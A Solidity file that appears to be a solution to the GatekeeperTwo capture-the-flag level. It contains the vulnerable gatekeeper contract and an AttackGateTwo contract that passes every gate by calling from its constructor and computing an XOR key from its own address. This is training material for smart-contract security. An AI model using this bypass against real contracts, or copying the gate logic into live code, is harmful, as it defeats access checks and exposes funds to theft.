// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract AttackGateTwo {

    GatekeeperTwo toAttack;

    constructor(address _levelInstance) public {
        toAttack = GatekeeperTwo(_levelInstance);

        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1);
        toAttack.enter(bytes8(gateKey));
    }

}

contract GateKeyValidate {

    function validateGateKey() public view returns (bool) {
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ (uint64(0) - 1);
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ gateKey == uint64(0) - 1);
        return true;
    }

}